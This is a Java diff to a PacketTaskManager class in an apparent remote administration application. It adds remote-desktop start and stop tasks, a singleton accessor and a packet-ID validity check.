@@ -15,10 +15,14 @@ public class PacketTaskManager {
 
     private ArrayList<PacketTask> packetTasks = new ArrayList<PacketTask>();
 
+    private static PacketTaskManager instance;
+
     public PacketTaskManager() {
+        instance = this;
         EventManager.register(this);
 
         this.addPacketTask(new PingTask());
+
         this.addPacketTask(new RemoteChatStartTask());
         this.addPacketTask(new RemoteChatStopTask());
         this.addPacketTask(new RemoteChatMessage());
@@ -27,6 +31,13 @@ public class PacketTaskManager {
         this.addPacketTask(new DisconnectClientTask());
         this.addPacketTask(new ShutdownClientApplicationTask());
         this.addPacketTask(new UninstallClientApplicationTask());
+
+        this.addPacketTask(new RemoteDesktopStartTask());
+        this.addPacketTask(new RemoteDesktopStopTask());
+    }
+
+    public static PacketTaskManager getInstance() {
+        return instance;
     }
 
     @EventTarget
@@ -34,7 +45,8 @@ public class PacketTaskManager {
         for(PacketTask task : packetTasks) {
             if(event.getPacketID() == task.getPacketID()) {
                 try {
-                    task.run(event.getInputStream(), event.getOutputStream());
+                    task.run(event.getClient());
+                    System.gc();
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
@@ -48,5 +60,13 @@ public class PacketTaskManager {
 
     public ArrayList<PacketTask> getPacketTasks() {
         return this.packetTasks;
+    }
+
+    public boolean isLegitPacket(int packet) {
+        for(PacketTask packetTask : packetTasks) {
+            if(packetTask.getPacketID() == packet)
+                return true;
+        }
+        return false;
     }
 }
